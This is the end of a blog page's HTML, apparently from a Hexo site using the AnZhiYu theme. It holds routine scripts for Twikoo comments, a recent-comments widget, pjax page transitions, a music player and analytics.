    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://twikoo.houyanbin.com/',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.houyanbin.com/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://twikoo.houyanbin.com/',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "visitor@anzhiy.cn";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>